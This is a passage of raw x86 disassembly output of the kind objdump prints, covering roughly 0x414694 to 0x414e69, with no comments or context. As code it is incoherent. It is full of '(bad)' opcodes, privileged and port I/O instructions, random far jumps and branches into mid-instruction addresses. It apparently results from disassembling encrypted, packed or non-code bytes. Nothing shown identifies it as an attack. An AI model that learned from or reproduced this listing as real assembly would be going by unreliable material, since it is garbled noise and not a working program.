  414694:	jns    0x4146a6
  414696:	xor    edi,DWORD PTR [eax*1+0xa76b81f]
  41469d:	(bad)  
  41469e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41469f:	xor    ebp,DWORD PTR [esi+0x1b]
  4146a2:	adc    bh,BYTE PTR ds:0x7a09e31
  4146a8:	and    edi,edi
  4146aa:	bound  esp,QWORD PTR [edx-0x5]
  4146ad:	nop
  4146ae:	cmp    dl,BYTE PTR [ebp+esi*8+0xa68a8e1]
  4146b5:	aam    0xfa
  4146b7:	cmp    esi,DWORD PTR [esi]
  4146b9:	lds    edi,FWORD PTR [bx+si]
  4146bc:	jmp    0x8e4c:0x42b7646b
  4146c3:	into   
  4146c4:	ret    0xbd5e
  4146c7:	adc    bl,0x8f
  4146ca:	cmp    al,0x0
  4146cc:	mov    esp,0xce29357b
  4146d1:	add    al,0xd4
  4146d3:	rcr    BYTE PTR [ebp+0x562cc83],0x61
  4146da:	sbb    dh,BYTE PTR [ecx+0x3e]
  4146dd:	mov    ds,WORD PTR ds:0x70423c59
  4146e3:	sar    DWORD PTR [ebp-0x6df9c63e],0xdd
  4146ea:	ins    BYTE PTR es:[edi],dx
  4146eb:	jp     0x4146ac
  4146ed:	outs   dx,DWORD PTR ds:[esi]
  4146ee:	mov    edx,0xa3481deb
  4146f3:	popf   
  4146f4:	or     si,WORD PTR [ebx-0x7a]
  4146f8:	cld    
  4146f9:	inc    eax
  4146fa:	lods   al,BYTE PTR ds:[esi]
  4146fb:	test   al,0x9
  4146fd:	jb     0x4146b5
  4146ff:	imul   BYTE PTR [edx+0x20]
  414702:	mov    edx,0x59838394
  414707:	sbb    eax,0xf43dc9d3
  41470c:	int    0x26
  41470e:	icebp  
  41470f:	in     al,0xb5
  414711:	shl    ebp,0x7e
  414714:	xor    dh,BYTE PTR [edx+ebp*8+0x13]
  414718:	jl     0x41470c
  41471a:	mov    eax,0xafae3646
  41471f:	push   es
  414720:	test   al,0xe
  414722:	push   eax
  414723:	fwait
  414724:	push   ebp
  414725:	sar    DWORD PTR [ecx],cl
  414727:	imul   ebx,DWORD PTR [edx],0x10
  41472a:	fwait
  41472b:	adc    al,0x71
  41472d:	jns    0x414779
  41472f:	jns    0x4146bf
  414731:	jle    0x4146db
  414733:	sahf   
  414734:	push   eax
  414735:	je     0x4147b2
  414737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414738:	test   BYTE PTR [edx-0x32],dh
  41473b:	push   edx
  41473c:	jns    0x414766
  41473e:	push   ecx
  41473f:	pop    ebp
  414740:	and    BYTE PTR [edx+edi*4+0x60687697],0x92
  414748:	scas   al,BYTE PTR es:[edi]
  414749:	sub    eax,DWORD PTR [ebx-0x58c3e662]
  41474f:	loope  0x414761
  414751:	sub    esp,esi
  414753:	mov    bh,0x42
  414755:	jno    0x41473a
  414757:	lds    esi,FWORD PTR [eax+0x34969ee5]
  41475d:	jge    0x4147cf
  41475f:	mov    dh,0xc0
  414761:	scas   al,BYTE PTR es:[edi]
  414762:	ins    BYTE PTR es:[edi],dx
  414763:	mov    ah,0x83
  414765:	retf   
  414766:	adc    DWORD PTR ds:[ebp+0x134baabc],edi
  41476d:	pop    ds
  41476e:	iret   
  41476f:	fcmove st,st(2)
  414771:	in     eax,dx
  414772:	daa    
  414773:	mov    ecx,0x1d43f812
  414778:	ds out 0xc,al
  41477b:	mov    ecx,0xa7531a3b
  414780:	jge    0x41474a
  414782:	xchg   DWORD PTR ds:0xab248e5e,ebx
  414788:	push   esp
  414789:	(bad)  
  41478a:	(bad)  
  41478b:	sbb    al,0xc8
  41478d:	ja     0x414737
  41478f:	adc    eax,0xe88adf37
  414794:	add    al,0xa5
  414796:	push   0x5cebf177
  41479b:	push   edi
  41479c:	mov    ecx,0x2d70ceae
  4147a1:	ret    0xb59
  4147a4:	imul   DWORD PTR [edx+eiz*2]
  4147a7:	mov    esp,0x865b68ec
  4147ac:	jecxz  0x414739
  4147ae:	xchg   edx,eax
  4147af:	xchg   esp,eax
  4147b0:	sahf   
  4147b1:	mov    eax,0x47bcef62
  4147b6:	sbb    al,0xf5
  4147b8:	test   eax,0x5b250a48
  4147bd:	and    edi,DWORD PTR [edx+0x5f29c7f7]
  4147c3:	cmp    DWORD PTR [ebx+esi*8],0xae203753
  4147ca:	mov    ebp,0x2052e38b
  4147cf:	in     al,0xc3
  4147d1:	stc    
  4147d2:	fs jle 0x414765
  4147d5:	and    al,0xea
  4147d7:	jbe    0x41484f
  4147d9:	jle    0x414763
  4147db:	pop    ecx
  4147dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147dd:	xor    DWORD PTR [ebx-0x52],eax
  4147e0:	loopne 0x4147a7
  4147e2:	fidiv  DWORD PTR [ebx-0x3c]
  4147e5:	(bad)  
  4147e6:	pop    ds
  4147e7:	ins    DWORD PTR es:[edi],dx
  4147e8:	inc    esi
  4147e9:	pusha  
  4147ea:	(bad)  
  4147eb:	pop    eax
  4147ec:	cmp    al,0x5a
  4147ee:	sahf   
  4147ef:	loop   0x4147f0
  4147f1:	and    edi,eax
  4147f3:	test   BYTE PTR [esi],dh
  4147f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147f6:	scas   al,BYTE PTR es:[edi]
  4147f7:	sbb    DWORD PTR [eax+ebp*1+0xeb1c3a1],ebp
  4147fe:	or     eax,0x963fcd49
  414803:	adc    ch,BYTE PTR [ebx+esi*2]
  414806:	int3   
  414807:	(bad)  
  414808:	jbe    0x414871
  41480a:	out    dx,al
  41480b:	inc    eax
  41480c:	push   esp
  41480d:	jg     0x414794
  41480f:	icebp  
  414810:	xchg   esi,eax
  414811:	cmp    DWORD PTR [edi+0x27458ee1],edx
  414817:	gs push edi
  414819:	bound  esp,QWORD PTR [esi+0x244ebd65]
  41481f:	leave  
  414820:	(bad)  
  414821:	jmp    0x3aed2a87
  414826:	stos   DWORD PTR es:[edi],eax
  414827:	test   al,0xd4
  414829:	dec    ebx
  41482a:	ja     0x4147d6
  41482c:	pop    es
  41482d:	mov    dh,0x8c
  41482f:	mov    ds:0x9609200d,al
  414834:	or     DWORD PTR [edx],edx
  414836:	dec    esp
  414837:	scas   al,BYTE PTR es:[edi]
  414838:	jg     0x414865
  41483a:	mov    bh,0x52
  41483c:	ret    
  41483d:	xor    bl,BYTE PTR [ebx-0x5aa57955]
  414843:	add    DWORD PTR [ebp-0x32],ebx
  414846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414847:	es jo  0x41484e
  41484a:	inc    edx
  41484b:	xor    al,0x95
  41484d:	mov    bh,0x50
  41484f:	(bad)  
  414851:	imul   esp,DWORD PTR [edi-0x41],0xc7cd3c8c
  414858:	and    eax,0xac7d7b38
  41485d:	sar    edi,cl
  41485f:	sub    ebp,DWORD PTR [ebx+0x76]
  414862:	out    dx,eax
  414863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414864:	cmp    al,ch
  414866:	int    0x42
  414868:	push   edi
  414869:	mov    esp,0x39d45538
  41486e:	sub    ecx,edx
  414870:	push   ebx
  414871:	xchg   DWORD PTR [eax-0x4a928556],ebp
  414877:	nop
  414878:	pushf  
  414879:	test   eax,0x3cb1d8f
  41487e:	dec    ebp
  41487f:	mov    eax,0x2ff0af1e
  414884:	pop    es
  414885:	out    0x1b,al
  414887:	hlt    
  414888:	arpl   WORD PTR [edx-0x27fbc79e],ax
  41488e:	jo     0x4148e6
  414890:	xor    esp,DWORD PTR [ebp+ebp*8+0x72dcdb42]
  414897:	mov    ds,WORD PTR [edi+0x68]
  41489a:	bound  edx,QWORD PTR [bx-0x1775]
  41489f:	jmp    0x3e4c:0x38face2
  4148a6:	iret   
  4148a7:	adc    BYTE PTR ds:0xc822e9c1,bh
  4148ad:	aad    0x85
  4148af:	mov    al,0x3f
  4148b1:	shl    DWORD PTR [edx+0x34],cl
  4148b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b5:	mov    dh,0x7c
  4148b7:	add    eax,0x8dee1f2
  4148bc:	jo     0x4148c0
  4148be:	or     DWORD PTR [ecx+0x3],esi
  4148c1:	sbb    BYTE PTR [eax+0x4],bl
  4148c4:	adc    al,0x1a
  4148c6:	nop
  4148c7:	repz push esi
  4148c9:	hlt    
  4148ca:	add    BYTE PTR [edx-0x2],cl
  4148cd:	adc    dh,ah
  4148cf:	push   es
  4148d0:	(bad)  
  4148d2:	push   ebp
  4148d3:	mov    bl,0x2
  4148d5:	push   es
  4148d6:	mov    al,0x38
  4148d8:	mov    eax,ds:0xea460e5d
  4148dd:	jae    0x4148b6
  4148df:	xor    al,0x1e
  4148e1:	int3   
  4148e2:	sub    edx,ecx
  4148e4:	sbb    ebp,DWORD PTR [eax-0x14]
  4148e7:	mov    dh,0xf0
  4148e9:	in     eax,0xd7
  4148eb:	fadd   QWORD PTR [edi-0x78]
  4148ee:	cdq    
  4148ef:	or     DWORD PTR [edi+ebp*8],edx
  4148f2:	push   eax
  4148f3:	and    DWORD PTR [ecx+eiz*4],ebp
  4148f6:	jp     0x4148e6
  4148f8:	xchg   esp,eax
  4148f9:	jl     0x4148f4
  4148fb:	and    al,0x13
  4148fd:	inc    edx
  4148fe:	mov    bh,0x6b
  414900:	pop    ecx
  414901:	jne    0x414940
  414903:	mov    edx,0x9e1d360a
  414908:	jnp    0x4148ec
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	or     DWORD PTR [edi-0x5e],ecx
  41490e:	xor    eax,0x65667ec7
  414913:	inc    ecx
  414914:	cmp    ah,al
  414916:	inc    edx
  414917:	cld    
  414918:	add    al,0x6c
  41491a:	lahf   
  41491b:	sbb    BYTE PTR [eax-0x740e3082],dl
  414921:	cmp    al,0x9f
  414923:	cmp    al,0xf9
  414925:	cmp    eax,0x7000497a
  41492a:	int    0xa1
  41492c:	adc    bh,BYTE PTR ds:0xe5932b22
  414932:	mov    eax,ebp
  414934:	bound  ebp,QWORD PTR [eax+edx*4-0x782c2ccb]
  41493b:	nop
  41493c:	jle    0x414994
  41493e:	arpl   sp,ax
  414940:	xor    al,0x84
  414942:	and    DWORD PTR [eax],ebp
  414944:	sahf   
  414945:	mov    eax,0x7028aada
  41494a:	cmp    bl,al
  41494c:	mov    DWORD PTR [ebx+eiz*8],esp
  41494f:	int    0x7d
  414951:	mov    dh,0x5c
  414953:	dec    ecx
  414954:	(bad)  
  414955:	hlt    
  414956:	adc    cl,BYTE PTR ds:0x58826e0a
  41495c:	xlat   BYTE PTR ds:[ebx]
  41495d:	push   cs
  41495e:	jecxz  0x41492f
  414960:	and    eax,0x2fd1119d
  414965:	shl    DWORD PTR [ecx+eiz*4+0x32f04404],0xfd
  41496d:	fiadd  WORD PTR [ebx+0x76]
  414970:	ret    
  414971:	jle    0x4149d5
  414973:	popa   
  414974:	lahf   
  414975:	aad    0x72
  414977:	ret    0xf8c7
  41497a:	aam    0xf5
  41497c:	ror    DWORD PTR [eax-0x76],0xf8
  414980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414981:	xor    ch,BYTE PTR [ecx]
  414983:	enter  0x6024,0x19
  414987:	jmp    0xb314c9b8
  41498c:	adc    edi,ebp
  41498e:	cld    
  41498f:	test   BYTE PTR [edx+ebx*8+0x5198d6eb],cl
  414996:	pop    ds
  414997:	fsubrp st(7),st
  414999:	int    0x2b
  41499b:	(bad)  
  41499c:	rsm    
  41499e:	fadd   QWORD PTR [edi+0x19cd3b1b]
  4149a4:	into   
  4149a5:	adc    al,0x31
  4149a7:	leave  
  4149a8:	dec    esi
  4149a9:	pop    esp
  4149aa:	inc    esi
  4149ab:	mov    eax,ds:0x1886d60
  4149b0:	(bad)
  4149b4:	cs aas 
  4149b6:	cmp    dl,BYTE PTR [eax]
  4149b8:	dec    ebp
  4149b9:	mov    BYTE PTR [edi-0x81ef02],bh
  4149bf:	adc    DWORD PTR [eax+esi*8-0x5c50fee8],edi
  4149c6:	or     esp,DWORD PTR [ecx-0x9]
  4149c9:	jae    0x41496d
  4149cb:	data16 fimul DWORD PTR gs:[edx-0x5633682b]
  4149d3:	add    bl,BYTE PTR [edx-0x4a]
  4149d6:	fadd   QWORD PTR [edx+0x55]
  4149d9:	sub    ah,BYTE PTR [ecx+0x55ff973a]
  4149df:	push   0xffffffe6
  4149e1:	rcl    BYTE PTR [ebp+0xb816aa3],cl
  4149e7:	dec    edi
  4149e8:	call   0xefbec736
  4149ed:	call   0x10bd:0xb616a4be
  4149f4:	adc    BYTE PTR [ebp-0x7f],bl
  4149f7:	inc    edx
  4149f8:	push   0xffffffbe
  4149fa:	aaa    
  4149fb:	pop    ebp
  4149fc:	xchg   ebp,eax
  4149fd:	xchg   BYTE PTR [eax+eax*1],ah
  414a00:	out    0xc3,al
  414a02:	adc    al,dh
  414a04:	je     0x414995
  414a06:	test   eax,0x4ca10e1a
  414a0b:	call   0xc017:0x324c0ce4
  414a12:	pop    ds
  414a13:	xor    eax,0xc2975715
  414a18:	pop    esp
  414a19:	std    
  414a1a:	clc    
  414a1b:	(bad)  
  414a1d:	mov    ebx,0xdccd7177
  414a22:	cmp    BYTE PTR [esi-0x80],bl
  414a25:	pushf  
  414a26:	xor    dh,bh
  414a28:	jp     0x414a77
  414a2a:	xlat   BYTE PTR ds:[ebx]
  414a2b:	out    dx,al
  414a2c:	cld    
  414a2d:	push   ds
  414a2e:	fs xchg esi,eax
  414a30:	mov    al,0x6b
  414a32:	loopne 0x4149f7
  414a34:	bound  esi,QWORD PTR [ebx+0xcf09eb2]
  414a3a:	jbe    0x414a9a
  414a3c:	pop    esp
  414a3d:	push   esp
  414a3e:	adc    eax,0x480ea111
  414a43:	push   es
  414a44:	jnp    0x414a52
  414a46:	sbb    al,0xad
  414a48:	mov    ah,0xb
  414a4a:	or     al,0x23
  414a4c:	xchg   al,bl
  414a4e:	pop    ebp
  414a4f:	pop    es
  414a50:	dec    BYTE PTR [edx-0x3c]
  414a53:	adc    eax,0xd4999f94
  414a58:	jmp    0xed65:0x87bdfcdc
  414a5f:	and    ah,dl
  414a61:	add    bl,BYTE PTR [ecx]
  414a63:	jp     0x414abf
  414a65:	adc    edi,esp
  414a67:	pop    ss
  414a68:	pop    es
  414a69:	xor    al,0x5b
  414a6b:	mov    eax,0x148b0371
  414a70:	sub    al,0xb2
  414a72:	fs push ebp
  414a74:	mov    bh,0x7d
  414a76:	mov    eax,ds:0x128e0b57
  414a7b:	mov    esp,0xfa4747d3
  414a80:	and    dl,BYTE PTR [esi+ecx*4]
  414a83:	imul   ebx,DWORD PTR [esi-0x43834593],0xc
  414a8a:	adc    eax,0xc97cc435
  414a8f:	hlt    
  414a90:	inc    esp
  414a91:	mov    dh,0xde
  414a93:	test   al,0xd3
  414a95:	push   0xdf35d075
  414a9a:	jmp    0x44cd4ac2
  414a9f:	out    dx,eax
  414aa0:	mov    ebp,0xcd01985a
  414aa5:	outs   dx,BYTE PTR ds:[esi]
  414aa6:	in     al,dx
  414aa7:	mov    eax,ecx
  414aa9:	out    0x7c,eax
  414aab:	mov    eax,ds:0xa3778879
  414ab0:	dec    ebp
  414ab1:	jne    0x414b14
  414ab3:	sub    BYTE PTR [esi],al
  414ab5:	jns    0x414af2
  414ab7:	sbb    eax,0x9e9a93fb
  414abc:	dec    DWORD PTR [ebx]
  414abe:	adc    DWORD PTR [ebx+0x47],0xffffffea
  414ac2:	int3   
  414ac3:	jnp    0x414af0
  414ac5:	test   al,0x8c
  414ac7:	mov    ds:0xd4e479c5,eax
  414acc:	outs   dx,BYTE PTR ds:[esi]
  414acd:	xchg   ecx,eax
  414ace:	retf   0xf36a
  414ad1:	dec    edx
  414ad2:	ss sbb eax,0xcaf07b5f
  414ad8:	push   eax
  414ad9:	(bad)  
  414ada:	mov    esp,0xe69f9d45
  414adf:	cwde   
  414ae0:	test   DWORD PTR [ebx],eax
  414ae2:	(bad)
  414ae5:	cmc    
  414ae6:	push   ebp
  414ae8:	mov    ecx,0xe1edb565
  414aed:	ret    
  414aee:	jmp    0xc214589c
  414af3:	push   ecx
  414af4:	scas   eax,DWORD PTR es:[edi]
  414af5:	jno    0x414b6a
  414af7:	sub    al,0xd8
  414af9:	or     DWORD PTR [edx+0x3857da53],ebx
  414aff:	dec    eax
  414b00:	cwde   
  414b01:	inc    esp
  414b02:	retf   
  414b03:	push   esp
  414b04:	mov    dl,BYTE PTR [ecx+ebp*4-0x5aa219ac]
  414b0b:	add    esi,DWORD PTR [ecx+0x62be0271]
  414b11:	dec    edx
  414b12:	or     al,0x4a
  414b14:	pop    ecx
  414b15:	mov    ebp,0x4878290c
  414b1a:	add    eax,0xf77cce94
  414b1f:	or     DWORD PTR ds:0xf3365ac0,ecx
  414b25:	jo     0x414b72
  414b27:	sub    BYTE PTR [ebx-0x75],ch
  414b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b2b:	sti    
  414b2c:	sar    esp,0x0
  414b2f:	scas   al,BYTE PTR es:[edi]
  414b30:	(bad)  
  414b31:	push   edx
  414b32:	call   0xec8c:0x7982027
  414b39:	pop    ds
  414b3a:	retf   0x672e
  414b3d:	and    eax,0x1dc1a1e
  414b42:	cmc    
  414b43:	add    BYTE PTR [ecx],0x71
  414b46:	adc    dh,BYTE PTR [edi-0x425b0dc3]
  414b4c:	pop    ebx
  414b4d:	jle    0x414bcd
  414b4f:	stos   DWORD PTR es:[edi],eax
  414b50:	loopne 0x414b8b
  414b52:	loopne 0x414b90
  414b54:	rcl    BYTE PTR ds:0x431d8f43,cl
  414b5a:	inc    esp
  414b5b:	jo     0x414bc5
  414b5d:	es or  bh,ah
  414b60:	into   
  414b61:	nop
  414b62:	jmp    0x6e78fc9b
  414b67:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  414b69:	js     0x414af4
  414b6b:	push   ebp
  414b6c:	mov    edi,0x49cb01f7
  414b71:	cmp    al,dh
  414b73:	popa   
  414b74:	data16 sub al,0xd
  414b77:	or     DWORD PTR [ebx],esi
  414b79:	imul   esp,DWORD PTR [edi+0x17],0xffffff8f
  414b7d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  414b7f:	js     0x414bb2
  414b81:	paddusw mm5,QWORD PTR [edx-0x23586811]
  414b88:	inc    eax
  414b89:	ja     0x414b5a
  414b8b:	ins    DWORD PTR es:[edi],dx
  414b8c:	fistp  QWORD PTR [eax]
  414b8e:	scas   al,BYTE PTR es:[edi]
  414b8f:	cs aam 0x19
  414b92:	push   eax
  414b93:	ret    0x10ed
  414b96:	sub    BYTE PTR [eax],0xb
  414b99:	repz adc ah,BYTE PTR [edx-0x73]
  414b9d:	adc    BYTE PTR [edi+0x36b0dedc],ch
  414ba3:	dec    eax
  414ba4:	mov    ch,0xa0
  414ba6:	mov    ch,0xa9
  414ba8:	in     eax,0xfd
  414baa:	stos   DWORD PTR es:[edi],eax
  414bab:	outs   dx,BYTE PTR ds:[esi]
  414bac:	fldenv [eax-0x60]
  414baf:	aad    0x52
  414bb1:	call   0xb1660002
  414bb6:	sub    edx,DWORD PTR [esi-0xd30ba06]
  414bbc:	sbb    edx,DWORD PTR [ecx+0x6a]
  414bbf:	mov    ch,0x2d
  414bc1:	mov    bh,0x52
  414bc3:	daa    
  414bc4:	aad    0xb2
  414bc6:	push   es
  414bc7:	(bad)
  414bca:	mov    dl,0x79
  414bcc:	and    bl,bh
  414bce:	xchg   ebp,eax
  414bcf:	xor    eax,0xb813b5e6
  414bd4:	xchg   edx,eax
  414bd5:	mov    ch,0x99
  414bd7:	int3   
  414bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bd9:	mov    dh,0x90
  414bdb:	sbb    esp,0xba68ba5d
  414be1:	cmp    eax,0x3775f069
  414be6:	mov    edi,0x5126b5d8
  414beb:	jbe    0x414bba
  414bed:	stos   DWORD PTR es:[di],eax
  414bef:	cmp    BYTE PTR [ebp-0x66d4b9c4],dh
  414bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bf6:	push   edi
  414bf7:	(bad)  
  414bf8:	loope  0x414c48
  414bfa:	pop    es
  414bfb:	cld    
  414bfc:	test   DWORD PTR [edx-0x63c68295],edi
  414c02:	(bad)  
  414c03:	cmp    ecx,DWORD PTR [ecx+esi*4-0x7f]
  414c07:	aas    
  414c08:	or     bl,ch
  414c0a:	repnz mov dl,al
  414c0d:	retf   0x6c4f
  414c10:	xchg   esp,eax
  414c11:	arpl   WORD PTR [ebp+0x401cfa8a],si
  414c17:	stc    
  414c18:	mov    ecx,0x77d19e76
  414c1d:	dec    eax
  414c1e:	push   eax
  414c1f:	popa   
  414c20:	push   0x4e191a13
  414c25:	jo     0x414baf
  414c27:	ss push ebp
  414c29:	jbe    0x414c29
  414c2b:	scas   eax,DWORD PTR es:[edi]
  414c2c:	fsub   DWORD PTR [ebx+0x4b]
  414c2f:	sbb    dl,bl
  414c31:	sub    ecx,ebx
  414c33:	out    dx,eax
  414c34:	(bad)  
  414c35:	retf   
  414c36:	adc    eax,DWORD PTR [ecx-0x3d56bcc5]
  414c3c:	mov    ds:0x8b59f1eb,al
  414c41:	lock fisttp DWORD PTR [edi]
  414c44:	push   ecx
  414c45:	mov    eax,ds:0x5425c2d0
  414c4a:	loop   0x414c55
  414c4c:	pop    edx
  414c4d:	inc    eax
  414c4e:	sbb    al,0x80
  414c50:	dec    esi
  414c51:	ins    DWORD PTR es:[edi],dx
  414c52:	cmp    eax,0x1a9af1b6
  414c57:	cmp    edi,DWORD PTR [edx-0x3133e7b7]
  414c5d:	push   DWORD PTR [ecx-0x47ffeffa]
  414c63:	and    DWORD PTR [ebx-0x70],edi
  414c66:	adc    eax,0xce3fca44
  414c6b:	push   0xd5a53f1e
  414c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c71:	pop    edi
  414c72:	dec    esi
  414c73:	mov    bh,0x7d
  414c75:	jbe    0x414c75
  414c77:	mov    BYTE PTR [eax+esi*2-0x41],bh
  414c7b:	pushf  
  414c7c:	sub    DWORD PTR [esi-0x6cbb8f39],ebp
  414c82:	jl     0x414c2b
  414c84:	inc    ebx
  414c85:	push   cs
  414c86:	cmc    
  414c87:	push   cs
  414c88:	adc    al,0x73
  414c8a:	mov    al,0x9f
  414c8c:	push   0x63
  414c8e:	int    0x3e
  414c90:	mov    esi,0x7e2954be
  414c95:	or     eax,0x89d5517d
  414c9a:	leave  
  414c9b:	xor    cl,ah
  414c9d:	adc    ah,BYTE PTR ds:0x4a36625d
  414ca3:	lahf   
  414ca4:	sbb    al,0xee
  414ca6:	hlt    
  414ca7:	popf   
  414ca8:	inc    edi
  414ca9:	int    0xf7
  414cab:	or     BYTE PTR [edi+0x23388bf4],bh
  414cb1:	mov    edx,DWORD PTR [eax+edi*2]
  414cb4:	aam    0xaa
  414cb6:	out    0x87,eax
  414cb8:	jle    0x414ca5
  414cba:	pop    ebx
  414cbb:	stos   DWORD PTR es:[edi],eax
  414cbc:	jle    0x414d33
  414cbe:	mov    WORD PTR [edx],ds
  414cc0:	call   0xb233:0xe9d61d64
  414cc7:	pop    ebp
  414cc8:	out    0xdd,eax
  414cca:	das    
  414ccb:	mov    ah,0x28
  414ccd:	push   esp
  414cce:	jge    0x414cd2
  414cd0:	inc    esp
  414cd1:	xchg   ecx,eax
  414cd2:	dec    ebp
  414cd3:	fsubr  DWORD PTR [edi-0x6d8e86ff]
  414cd9:	leave  
  414cda:	cli    
  414cdb:	mov    al,ds:0xf84524ef
  414ce0:	sub    eax,0xee9629b6
  414ce5:	out    dx,al
  414ce6:	and    al,0xc9
  414ce8:	es and al,0xcd
  414ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cec:	iret   
  414ced:	xrelease xchg DWORD PTR [edi+0x31],edi
  414cf1:	outs   dx,DWORD PTR ds:[esi]
  414cf2:	push   edx
  414cf3:	jmp    0xe574658d
  414cf8:	icebp  
  414cf9:	sub    ecx,DWORD PTR [edx+0x33e26351]
  414cff:	mov    ch,0xb9
  414d01:	adc    edi,DWORD PTR [edi]
  414d03:	retf   
  414d04:	add    esi,DWORD PTR [esi+0x604216c0]
  414d0a:	mov    esp,DWORD PTR [esi-0xd]
  414d0d:	out    0xd3,eax
  414d0f:	cmp    al,0xca
  414d11:	pop    esp
  414d12:	sbb    al,0xa0
  414d14:	push   cs
  414d15:	(bad)  
  414d16:	mov    eax,ds:0x5e87dc53
  414d1b:	mov    ebx,0xbffcd45d
  414d20:	(bad)  
  414d21:	pop    ebx
  414d22:	lods   al,BYTE PTR ds:[esi]
  414d23:	pop    ss
  414d24:	add    DWORD PTR [ebx-0x18],0x2d
  414d28:	pop    ds
  414d29:	ss sub dh,dh
  414d2c:	pop    edx
  414d2d:	popa   
  414d2e:	lods   al,BYTE PTR ds:[esi]
  414d2f:	xlat   BYTE PTR ds:[ebx]
  414d30:	addr16 jle 0x414cef
  414d33:	dec    ecx
  414d34:	dec    eax
  414d35:	sub    cl,BYTE PTR [ebx-0xa]
  414d38:	sti    
  414d39:	rol    ebx,cl
  414d3b:	scas   al,BYTE PTR es:[edi]
  414d3c:	sub    al,0x98
  414d3e:	repz mov edi,0xdb84df63
  414d44:	add    ebx,DWORD PTR [edx]
  414d46:	push   ebp
  414d47:	lods   al,BYTE PTR ds:[esi]
  414d48:	cmp    bl,al
  414d4a:	adc    DWORD PTR [ebx+0x14dc613b],ebx
  414d50:	mov    edx,esp
  414d52:	dec    ebx
  414d53:	xchg   esi,eax
  414d54:	je     0x414d76
  414d56:	ficom  WORD PTR [esi]
  414d58:	stos   DWORD PTR es:[edi],eax
  414d59:	sbb    al,0x24
  414d5b:	cmp    al,0x46
  414d5e:	or     DWORD PTR [ebx],ebx
  414d60:	sahf   
  414d61:	mov    edi,0x3bef43fa
  414d66:	cmp    BYTE PTR [ebx],0x13
  414d69:	dec    esp
  414d6a:	jnp    0x414cff
  414d6c:	(bad)  
  414d6d:	repz mov fs,edi
  414d70:	addr16 stc 
  414d72:	cmp    bl,cl
  414d74:	jle    0x414d3c
  414d76:	inc    esp
  414d77:	dec    edx
  414d78:	cmp    BYTE PTR [eax],bl
  414d7a:	xchg   ebx,eax
  414d7b:	xor    al,0x24
  414d7d:	push   eax
  414d7e:	adc    edi,DWORD PTR [ebp-0x7df83c4c]
  414d84:	push   0x191faca8
  414d89:	dec    edi
  414d8a:	inc    esi
  414d8b:	cmp    ch,BYTE PTR [eax-0x20]
  414d8e:	jns    0x414dec
  414d90:	rcr    DWORD PTR [esp+ebx*2+0x630ae727],1
  414d97:	or     BYTE PTR [esi*2-0x7cc66672],0x15
  414d9f:	ror    BYTE PTR [eax],0x97
  414da2:	adc    eax,0x7b9e5b38
  414da7:	stos   BYTE PTR es:[edi],al
  414da8:	mov    al,0xae
  414daa:	pop    esi
  414dab:	ret    0x98d1
  414dae:	retf   0x52a6
  414db1:	sbb    BYTE PTR [ebp-0x49e93c89],dh
  414db7:	popf   
  414db8:	cmp    eax,0x7c5e5ead
  414dbd:	inc    esp
  414dbe:	add    al,0x20
  414dc0:	clc    
  414dc1:	cmp    al,0x5
  414dc3:	sub    ch,BYTE PTR [ebp-0x6f]
  414dc6:	sti    
  414dc7:	and    DWORD PTR [esi+eiz*4+0x18f9637c],eax
  414dce:	jp     0x414e43
  414dd0:	ret    
  414dd1:	shl    dl,1
  414dd3:	mov    WORD PTR [ebx-0x7],cs
  414dd6:	jmp    0x6027:0xfe299c91
  414ddd:	xor    al,0xc9
  414ddf:	xchg   ecx,eax
  414de0:	sub    BYTE PTR ds:0xec883749,al
  414de6:	out    0xfe,eax
  414de8:	cmp    eax,0xcc528a40
  414ded:	jmp    0x414e57
  414def:	aam    0x58
  414df1:	repz out dx,eax
  414df3:	fsub   st,st(0)
  414df5:	imul   ebx,DWORD PTR [ebx+esi*8-0x4e],0x239868d1
  414dfd:	pop    edx
  414dfe:	lds    esp,FWORD PTR [edx+0x7199bae7]
  414e04:	(bad)  
  414e05:	dec    edi
  414e06:	adc    al,0x69
  414e08:	(bad)  
  414e09:	out    0xa6,eax
  414e0b:	push   edi
  414e0c:	jge    0x414db9
  414e0e:	add    al,0xc2
  414e10:	nop
  414e11:	add    al,0x97
  414e13:	retf   0xa2f9
  414e16:	fild   DWORD PTR [eax]
  414e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e19:	aad    0x9c
  414e1b:	sub    edx,esi
  414e1d:	cmp    ebx,DWORD PTR [ebx+0x2]
  414e20:	sub    bl,ah
  414e22:	popf   
  414e23:	pop    edi
  414e24:	mov    eax,0x39720a9d
  414e29:	stos   DWORD PTR es:[edi],eax
  414e2a:	int    0x4a
  414e2c:	outs   dx,DWORD PTR ds:[esi]
  414e2d:	mov    BYTE PTR [ecx-0x68dc9422],bl
  414e33:	out    dx,al
  414e34:	inc    edi
  414e35:	not    DWORD PTR [ebp+0x35a27038]
  414e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e3c:	sub    al,0xb
  414e3e:	shl    BYTE PTR [edx+0xcc0096f],1
  414e44:	ret    0x6f7d
  414e47:	fs cwde 
  414e49:	cmp    BYTE PTR [esi-0x1e],cl
  414e4c:	fnstsw WORD PTR [edi]
  414e4e:	stc    
  414e4f:	inc    esi
  414e50:	icebp  
  414e51:	pop    ebp
  414e52:	(bad)  
  414e53:	pop    ebx
  414e54:	sbb    al,0xd8
  414e57:	mov    ch,0xea
  414e59:	mov    ch,0x89
  414e5b:	mov    eax,ds:0xc3e83766
  414e60:	mov    cl,0x7f
  414e62:	inc    esi
  414e63:	sub    DWORD PTR [ebp+esi*1+0x8],0xffffffeb
  414e68:	into   
  414e69:	js     0x414e15
